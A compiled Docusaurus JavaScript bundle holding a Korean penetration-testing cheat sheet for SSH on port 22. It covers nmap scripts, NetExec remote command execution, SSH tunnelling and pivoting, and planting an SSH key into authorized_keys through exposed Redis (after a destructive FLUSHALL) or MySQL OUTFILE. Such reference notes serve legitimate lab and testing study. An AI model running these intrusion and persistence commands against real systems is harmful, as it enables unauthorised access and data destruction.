"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[7285],{28453:(e,s,n)=>{n.d(s,{R:()=>l,x:()=>d});var r=n(96540);const i={},a=r.createContext(i);function l(e){const s=r.useContext(a);return r.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function d(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:l(e.components),r.createElement(a.Provider,{value:s},e.children)}},61890:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>h,contentTitle:()=>d,default:()=>o,frontMatter:()=>l,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"cheatsheet/services/ssh","title":"SSH - 22","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/cheatsheet/services/ssh.md","sourceDirName":"cheatsheet/services","slug":"/cheatsheet/services/ssh","permalink":"/my-docusaurus-page/cheatsheet/services/ssh","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"FTP - 21","permalink":"/my-docusaurus-page/cheatsheet/services/ftp"},"next":{"title":"Kerberos - 88","permalink":"/my-docusaurus-page/cheatsheet/services/kerberos"}}');var i=n(74848),a=n(28453);const l={sidebar_position:2},d="SSH - 22",h={},c=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"\uae30\ubcf8 \uc5f0\uacb0",id:"\uae30\ubcf8-\uc5f0\uacb0",level:2},{value:"Private Key \uc218\uc815",id:"private-key-\uc218\uc815",level:2},{value:"Nmap",id:"nmap",level:2},{value:"NetExec",id:"netexec",level:2},{value:"SSH \ud130\ub110\ub9c1",id:"ssh-\ud130\ub110\ub9c1",level:2},{value:"Local Port Forwarding",id:"local-port-forwarding",level:3},{value:"Dynamic Port Forwarding (SOCKS Proxy)",id:"dynamic-port-forwarding-socks-proxy",level:3},{value:"Remote Port Forwarding",id:"remote-port-forwarding",level:3},{value:"Remote Dynamic Port Forwarding",id:"remote-dynamic-port-forwarding",level:3},{value:"sshuttle",id:"sshuttle",level:2},{value:"Windows SSH (ssh.exe)",id:"windows-ssh-sshexe",level:2},{value:"SSH Key \uc0bd\uc785",id:"ssh-key-\uc0bd\uc785",level:2},{value:"Redis\ub97c \ud1b5\ud55c SSH Key \uc0bd\uc785",id:"redis\ub97c-\ud1b5\ud55c-ssh-key-\uc0bd\uc785",level:3},{value:"MySQL\uc744 \ud1b5\ud55c SSH Key \uc0bd\uc785",id:"mysql\uc744-\ud1b5\ud55c-ssh-key-\uc0bd\uc785",level:3},{value:"SSH \uc11c\ubc84 \uc2dc\uc791",id:"ssh-\uc11c\ubc84-\uc2dc\uc791",level:2},{value:"\uc124\uc815 \ud30c\uc77c",id:"\uc124\uc815-\ud30c\uc77c",level:2},{value:"\ub85c\uadf8 \ud30c\uc77c",id:"\ub85c\uadf8-\ud30c\uc77c",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function t(e){const s={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.header,{children:(0,i.jsx)(s.h1,{id:"ssh---22",children:"SSH - 22"})}),"\n",(0,i.jsx)(s.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,i.jsxs)(s.p,{children:[(0,i.jsx)(s.strong,{children:"\ud3ec\ud2b8"}),": 22 (\uae30\ubcf8)"]}),"\n",(0,i.jsx)(s.h2,{id:"\uae30\ubcf8-\uc5f0\uacb0",children:"\uae30\ubcf8 \uc5f0\uacb0"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# \uae30\ubcf8 \uc5f0\uacb0\nssh <USERNAME>@<RHOST>\n\n# \ud3ec\ud2b8 \uc9c0\uc815\nssh <USERNAME>@<RHOST> -p <PORT>\n\n# Private Key \uc0ac\uc6a9\nssh -i id_rsa <USERNAME>@<RHOST>\n\n# \uad6c\uc2dd \uc54c\uace0\ub9ac\uc998 \uc0ac\uc6a9 (\uc624\ub798\ub41c \uc11c\ubc84\uc6a9)\nssh <USERNAME>@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1\n"})}),"\n",(0,i.jsx)(s.h2,{id:"private-key-\uc218\uc815",children:"Private Key \uc218\uc815"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# \uc904\ubc14\uafc8 \ubb38\uc790 \ubcc0\ud658\ndos2unix id_rsa\n\n# Vim\uc73c\ub85c \uc815\ub9ac\nvim --clean id_rsa\n\n# \uad8c\ud55c \uc124\uc815\nchmod 600 id_rsa\n\n# \ud55c \uc904\ub85c \uc2e4\ud589\ndos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 600 id_rsa\n"})}),"\n",(0,i.jsx)(s.h2,{id:"nmap",children:"Nmap"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# \ud3ec\ud2b8 \uc2a4\uce94\nsudo nmap -p22 -sV <RHOST>\n\n# SSH NSE \uc2a4\ud06c\ub9bd\ud2b8 \ucc3e\uae30\nls -lh /usr/share/nmap/scripts/*ssh*\nlocate -r '\\.nse$' | xargs grep categories | grep ssh\n\n# SSH \ud638\uc2a4\ud2b8\ud0a4 \ud655\uc778\nsudo nmap -p22 --script ssh-hostkey <RHOST>\n\n# SSH \uc778\uc99d \ubc29\ubc95 \ud655\uc778\nsudo nmap -p22 --script ssh-auth-methods <RHOST>\n\n# \uc57d\ud55c \uc554\ud638\ud654 \uc54c\uace0\ub9ac\uc998 \ud655\uc778\nsudo nmap -p22 --script ssh2-enum-algos <RHOST>\n"})}),"\n",(0,i.jsx)(s.h2,{id:"netexec",children:"NetExec"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# \uba85\ub839 \uc2e4\ud589\nnetexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -x <COMMAND>\n\n# \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc\nnetexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --get-file /PATH/TO/FOLDER/<FILE> <FILE>\n\n# \ud30c\uc77c \uc5c5\ub85c\ub4dc\nnetexec ssh <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE> /PATH/TO/FOLDER/<FILE>\n"})}),"\n",(0,i.jsx)(s.h2,{id:"ssh-\ud130\ub110\ub9c1",children:"SSH \ud130\ub110\ub9c1"}),"\n",(0,i.jsx)(s.h3,{id:"local-port-forwarding",children:"Local Port Forwarding"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# \ub85c\uceec \ud3ec\ud2b8\ub97c \uc6d0\uaca9 \uc11c\ubc84\ub85c \ud3ec\uc6cc\ub529\nssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20\n\n# \uc0ac\uc6a9 \uc608\uc2dc\nsmbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>\n"})}),"\n",(0,i.jsx)(s.h3,{id:"dynamic-port-forwarding-socks-proxy",children:"Dynamic Port Forwarding (SOCKS Proxy)"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# SOCKS \ud504\ub85d\uc2dc \uc0dd\uc131\nssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20\n\n# proxychains \uc124\uc815 (/etc/proxychains4.conf)\n# socks5 192.168.50.10 9999\n\n# \uc0ac\uc6a9 \uc608\uc2dc\nproxychains smbclient //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>\nproxychains nmap -vvv -sT --top-ports=20 -Pn -n <RHOST>\n"})}),"\n",(0,i.jsx)(s.h3,{id:"remote-port-forwarding",children:"Remote Port Forwarding"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# \uc6d0\uaca9 \uc11c\ubc84\uc758 \ud3ec\ud2b8\ub97c \ub85c\uceec\ub85c \ud3ec\uc6cc\ub529\nssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10\n\n# \uc0ac\uc6a9 \uc608\uc2dc\npsql -h 127.0.0.1 -p 2345 -U postgres\n"})}),"\n",(0,i.jsx)(s.h3,{id:"remote-dynamic-port-forwarding",children:"Remote Dynamic Port Forwarding"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# \uc6d0\uaca9 SOCKS \ud504\ub85d\uc2dc\nssh -N -R 9998 <USERNAME>@192.168.50.10\n\n# proxychains \uc124\uc815\n# socks5 127.0.0.1 9998\n\n# \ud3ec\ud2b8 \ud655\uc778\nsudo ss -tulpn\n"})}),"\n",(0,i.jsx)(s.h2,{id:"sshuttle",children:"sshuttle"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# VPN over SSH\nsshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24\n\n# \uc0ac\uc6a9 \uc608\uc2dc\nsmbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>\n"})}),"\n",(0,i.jsx)(s.h2,{id:"windows-ssh-sshexe",children:"Windows SSH (ssh.exe)"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# Windows\uc5d0\uc11c SSH \uc704\uce58 \ud655\uc778\nwhere ssh\n# C:\\Windows\\System32\\OpenSSH\\ssh.exe\n\n# Windows\uc5d0\uc11c Remote Dynamic Port Forwarding\nC:\\Windows\\System32\\OpenSSH\\ssh.exe -N -R 9998 <USERNAME>@192.168.50.10\n"})}),"\n",(0,i.jsx)(s.h2,{id:"ssh-key-\uc0bd\uc785",children:"SSH Key \uc0bd\uc785"}),"\n",(0,i.jsx)(s.h3,{id:"redis\ub97c-\ud1b5\ud55c-ssh-key-\uc0bd\uc785",children:"Redis\ub97c \ud1b5\ud55c SSH Key \uc0bd\uc785"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:'# Redis CLI \uc5f0\uacb0\nredis-cli -h <RHOST>\n\n# \uae30\uc874 \ub370\uc774\ud130 \uc0ad\uc81c\necho "FLUSHALL" | redis-cli -h <RHOST>\n\n# SSH \uacf5\uac1c\ud0a4 \uc900\ube44\n(echo -e "\\n\\n"; cat ~/.ssh/id_rsa.pub; echo -e "\\n\\n") > /tmp/spub.txt\n\n# Redis\uc5d0 \ud0a4 \uc800\uc7a5\ncat /tmp/spub.txt | redis-cli -h <RHOST> -x set s-key\n\n# authorized_keys\ub85c \uc800\uc7a5\nredis-cli -h <RHOST>\n> get s-key\n> CONFIG GET dir\n> CONFIG SET dir /var/lib/redis/.ssh\n> CONFIG SET dbfilename authorized_keys\n> save\n'})}),"\n",(0,i.jsx)(s.h3,{id:"mysql\uc744-\ud1b5\ud55c-ssh-key-\uc0bd\uc785",children:"MySQL\uc744 \ud1b5\ud55c SSH Key \uc0bd\uc785"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-sql",children:"-- authorized_keys2 \ud30c\uc77c\uc5d0 \ud0a4 \uc791\uc131\nSELECT \"<SSH_PUBLIC_KEY>\" INTO OUTFILE '/root/.ssh/authorized_keys2' \nFIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\\n';\n"})}),"\n",(0,i.jsx)(s.h2,{id:"ssh-\uc11c\ubc84-\uc2dc\uc791",children:"SSH \uc11c\ubc84 \uc2dc\uc791"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# SSH \uc11c\ube44\uc2a4 \uc2dc\uc791\nsudo systemctl start ssh\nsudo systemctl enable ssh\n\n# SSH \uc11c\ube44\uc2a4 \uc0c1\ud0dc \ud655\uc778\nsudo systemctl status ssh\n\n# \ud3ec\ud2b8 \ud655\uc778\nsudo ss -tulpn | grep :22\n"})}),"\n",(0,i.jsx)(s.h2,{id:"\uc124\uc815-\ud30c\uc77c",children:"\uc124\uc815 \ud30c\uc77c"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# SSH \ud074\ub77c\uc774\uc5b8\ud2b8 \uc124\uc815\n/etc/ssh/ssh_config\n~/.ssh/config\n\n# SSH \uc11c\ubc84 \uc124\uc815\n/etc/ssh/sshd_config\n\n# Known hosts\n~/.ssh/known_hosts\n\n# Authorized keys\n~/.ssh/authorized_keys\n~/.ssh/authorized_keys2\n"})}),"\n",(0,i.jsx)(s.h2,{id:"\ub85c\uadf8-\ud30c\uc77c",children:"\ub85c\uadf8 \ud30c\uc77c"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"# SSH \ub85c\uadf8\n/var/log/auth.log          # Debian/Ubuntu\n/var/log/secure            # RHEL/CentOS\n\n# SSH \uc5f0\uacb0 \ub85c\uadf8 \ud655\uc778\ngrep sshd /var/log/auth.log\njournalctl -u ssh\n"})}),"\n",(0,i.jsx)(s.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,i.jsxs)(s.ul,{children:["\n",(0,i.jsx)(s.li,{children:"Private Key \uad8c\ud55c: 600"}),"\n",(0,i.jsx)(s.li,{children:"Authorized Keys \uad8c\ud55c: 644"}),"\n",(0,i.jsx)(s.li,{children:".ssh \ub514\ub809\ud1a0\ub9ac \uad8c\ud55c: 700"}),"\n",(0,i.jsx)(s.li,{children:"\uad6c\uc2dd \uc54c\uace0\ub9ac\uc998 \uc9c0\uc6d0 \ud655\uc778"}),"\n",(0,i.jsx)(s.li,{children:"PasswordAuthentication \uc124\uc815 \ud655\uc778"}),"\n"]})]})}function o(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(t,{...e})}):t(e)}}}]);